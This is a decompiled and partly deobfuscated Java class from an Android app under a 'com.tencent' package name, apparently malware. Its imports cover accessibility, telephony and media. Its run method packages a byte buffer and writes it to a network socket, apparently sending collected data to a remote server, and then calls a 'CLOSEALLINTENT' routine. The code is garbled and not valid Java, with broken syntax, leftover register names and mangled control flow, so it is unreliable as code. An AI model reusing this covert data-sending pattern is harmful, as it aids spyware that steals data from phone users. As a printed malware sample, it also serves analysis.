package com.tencent;

import android.content.*;
import android.view.*;
import android.widget.*;
import android.app.*;
import android.os.*;
import android.accessibilityservice.*;
import android.view.accessibility.*;
import android.telephony.*;
import android.media.*;
import java.util.*;
import java.io.*;
import java.net.*;

/**
 * Deobfuscated class: DataEncryptionEngine_3
 * Original: Lcom/tencent/tunesxconcerningn102$3;
 */
class DataEncryptionEngine_3 implements Runnable; {

    // === FIELDS ===
    final byte[] val$b;
    final String val$s;

    // === METHODS ===

     void Constructor(String param0, byte[] param1) {
        v0.val$s = v1;
        v0.val$b = v2;
        // new Object()
        return;
    }

    public void run() {
        v0 = DataEncryptionEngine.y;
        synchronized (v0) {
        v1 = v5.val$s;
        v2 = v5.val$b;
        v2 = DataPackagingEngine.eliminateicoolerh28(v1, v2);
        v2 = DataEncryptionEngine.rec_tunesxconcerningn102_iver;
        v3 = v1.length;
        v2.setSendBufferSize(v3);
        v2 = DataEncryptionEngine.outpu_tunesxconcerningn102_tnew;
        v3 = v1.length;
        v4 = 0;
        v2.write(v1, 0, v3);
        }
        // goto (branch)
        }
        throw v1;
        v0 = "rbgtdnsryjtgfhtsryddrjt";
        DataEncryptionEngine.CLOSEALLINTENT("rbgtdnsryjtgfhtsryddrjt");
        return;
    }
}
